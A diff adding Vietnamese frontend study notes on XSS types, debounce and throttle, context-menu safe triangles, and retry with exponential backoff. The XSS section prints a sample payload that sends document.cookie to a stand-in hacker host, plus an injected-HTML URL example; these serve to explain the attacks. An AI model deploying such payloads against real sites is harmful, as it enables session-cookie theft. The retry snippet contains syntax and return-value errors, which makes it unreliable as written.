@@ -1,0 +1,59 @@
+# Cách kiểu tấn công XSS
+innterHTML thì ngừoi dùng có thể input code js nguy hiểm, dùng textContent có thể tránh được.
+innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML và khuyên k nên dùng. VD: <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
+Tương tự thuộc tính href thẻ a cũng k an toàn. Khuyên dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity.
+
+-> Reflected XSS
+User login 1 trang web sẽ có session cookies -> Hacker gửi cho người dùng 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.
+
+-> Stored XSS
+Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy đoạn XSS script từ server gửi về thực thi là toang
+
+-> DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
+Hacker lừa người dùng truy cập vào URL của 1 trang web để đăng nhập là: http://example.com/register.php?message=Please fill in the form
+Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("hacked");}</script>
+=> Dòng please fill in the form biến thành 1 input gender vì browser nó render html như v, khi người dùng kb vào chọn gender thì script được thực thi
+
+
+
+# Dùng debounce throttle
+Có thể tự implement hoặc dùng lib như lodash
+
+-> throttle: Giới hạn số lần gọi hàm trong 1 ktg. VD ta có thể set là "Bất cứ 10s liên tiếp nào cũng k có quá 100 lần gọi hàm này"
+VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng throttle giảm số lần xử lý sẽ đỡ lag.
+VD: thg dung trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn
+
+-> debounce: Event chỉ được gọi 1 lần sau 1 ktg cố định kể từ khi lần trigger mới nhất. Tức trigger liên tục 1 event quá nhanh sẽ chỉ gọi 1 lần ở cuối
+VD: tính năng search gõ liên tục sẽ chỉ tự thực hiện search sau khi gõ xong
+
+
+
+# Tạo safe triangle cho context menu
+Giải thích rõ cơ chế ở: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
+Cụ thể là xử lý sự kiện mouse enter và mouse leave. Dùng toán check con chuột trong hình tam giác thì disable mouse pointer event đi là xong
+
+
+
+# Dùng retryable
+Request lỗi k nên dừng luôn và bắt user refresh trang, ta phải implement retryable. Chỉ dùng khi bị lỗi mạng và biết rằng việc retry có thể thành công. Nếu biết rằng retry request vẫn sẽ báo lỗi y như v thì nên kết thúc và show lỗi cho người dùng biết.
+
+K nên retry liên tục vô hạn mà phải sleep 3s rồi retry max 5 lần chẳng hạn. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế. Vì 3s sau lại có người mới vào, 6s sau lại có người mới vào.
+=> Giải pháp là cộng thêm 1 số random cho khoảng thời gian sleep là được. 
+
+K nên retry mỗi 3s vì trong khoảng thời gian ngắn, xác suất request gặp lại lỗi cũ rất cao. Giải pháp exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. Nó xuất hiện trong các pp nhập mật khẩu, VD nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.
+
+VD càng sai càng chờ lâu, liên tục trong 3 lần, cộng 1 khoảng random từ 0->1s:
+static async fetchWithRetry(url, errorCount = 0) => {
+  const ERROR_COUNT_MAX = 3;
+  const response = await fetch(url);
+  if(response.status < 200 || response.status >= 300) {
+    // Log lỗi 
+    if(errorCount < ERROR_COUNT_MAX){
+      await new Promise(r => setTimeout(r, 
+        Math.pow(2, errorCount)*3000 + Math.random()*1000
+      ));
+      await this.fetchWithRetry(url, errorCount + 1);
+    }
+  }
+}
+
